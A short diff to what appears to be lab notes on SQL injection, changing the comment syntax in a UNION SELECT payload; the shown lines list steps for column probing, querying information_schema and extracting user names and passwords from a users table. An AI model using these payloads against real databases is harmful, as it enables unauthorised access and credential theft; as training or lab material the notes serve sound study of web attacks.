@@ -12,7 +12,7 @@
 `1 order by 2` -> Work because 1 is a number
 
 3. Get columns from user table
-`1 UNION SELECT column_name, table_name FROM information_schema.tables #`
+`1 UNION SELECT column_name, table_name FROM information_schema.tables#`
 
 4. Get id & pwd
 `1 UNION SELECT user, password FROM users#`
